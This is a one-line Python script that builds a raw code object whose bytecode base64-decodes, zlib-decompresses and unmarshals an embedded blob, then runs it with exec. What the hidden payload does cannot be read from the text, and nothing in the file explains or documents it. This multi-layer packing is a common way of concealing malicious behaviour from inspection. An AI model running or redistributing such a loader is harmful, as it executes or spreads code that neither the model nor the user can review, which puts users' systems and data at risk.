_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z\x16e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00d\x04S\x00\x04\x00e\x05y/\x01\x00Z\x06\x01\x00z\re\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x00Y\x00d\x04Z\x06[\x06d\x04S\x00d\x04Z\x06[\x06w\x01w\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'Lambda.py','<module>',1,b'.\x01',(),());_()
